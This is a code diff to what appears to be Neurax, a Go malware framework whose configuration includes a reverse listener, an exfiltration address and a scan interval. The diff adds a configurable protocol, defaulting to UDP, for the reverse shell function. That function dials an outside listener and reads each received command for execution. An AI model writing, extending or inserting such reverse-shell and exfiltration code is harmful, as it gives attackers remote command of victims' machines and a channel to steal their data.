@@ -90,6 +90,7 @@ type __NeuraxConfig struct {
 	Remove          bool
 	ScanInterval    string
 	ReverseListener string
+	ReverseProto    string
 	PreventReexec   bool
 	ExfilAddr       string
 	WordlistExpand  bool
@@ -119,6 +120,7 @@ var NeuraxConfig = __NeuraxConfig{
 	Remove:          false,
 	ScanInterval:    "2m",
 	ReverseListener: "none",
+	ReverseProto:    "udp",
 	PreventReexec:   true,
 	ExfilAddr:       "none",
 	WordlistExpand:  false,
@@ -373,8 +375,8 @@ func NeuraxOpenComm() {
 }
 
 //Launches a reverse shell. Each received command is passed to handle_command()
-func NeuraxReverse(proto string) {
-	conn, _ := net.Dial(proto, NeuraxConfig.ReverseListener)
+func NeuraxReverse() {
+	conn, _ := net.Dial(NeuraxConfig.ReverseProto, NeuraxConfig.ReverseListener)
 	for {
 		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
